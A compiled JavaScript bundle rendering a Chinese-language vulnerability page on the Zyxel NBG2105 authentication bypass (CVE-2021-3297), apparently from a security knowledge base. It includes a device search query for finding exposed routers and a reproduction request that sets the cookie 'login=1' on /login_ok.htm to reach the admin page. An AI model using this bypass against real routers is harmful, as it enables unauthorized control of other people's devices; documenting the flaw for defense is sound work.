(window.webpackJsonp=window.webpackJsonp||[]).push([[170],{1430:function(s,t,a){s.exports=a.p+"assets/img/zyxel-5.9b8b644b.png"},1431:function(s,t,a){s.exports=a.p+"assets/img/zyxel-6.45859bbd.png"},1432:function(s,t,a){s.exports=a.p+"assets/img/zyxel-7.ae01c50f.png"},2707:function(s,t,a){"use strict";a.r(t);var e=a(75),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"zyxel-nbg2105-身份验证绕过-cve-2021-3297"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#zyxel-nbg2105-身份验证绕过-cve-2021-3297"}},[s._v("#")]),s._v(" Zyxel NBG2105 身份验证绕过 CVE-2021-3297")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Zyxel NBG2105")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('app="ZyXEL-NBG2105"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("登录页面如下")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1430),alt:"img"}})]),s._v(" "),e("p",[s._v("其中前端文件 "),e("code",[s._v("/js/util_gw.js")]),s._v(" 存在前端对 Cookie login参数的校验")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1431),alt:"img"}})]),s._v(" "),e("p",[s._v("可以看到检测到 Cookie中的 "),e("code",[s._v("login=1")]),s._v(" 则跳转 home.html")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("function setCookie() //login_ok.htm use\n{\n\tdocument.cookie=\"login=1\";\n\tMM_goToURL('parent', 'home.htm');\n}\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[s._v("请求如下则会以管理员身份跳转到 "),e("code",[s._v("home.htm页面")])]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("http://xxx.xxx.xxx.xxx/login_ok.htm\n\nCookie: login=1;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1432),alt:"img"}})]),s._v(" "),e("h2",{attrs:{id:""}},[e("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])])],1)}),[],!1,null,null,null);t.default=n.exports}}]);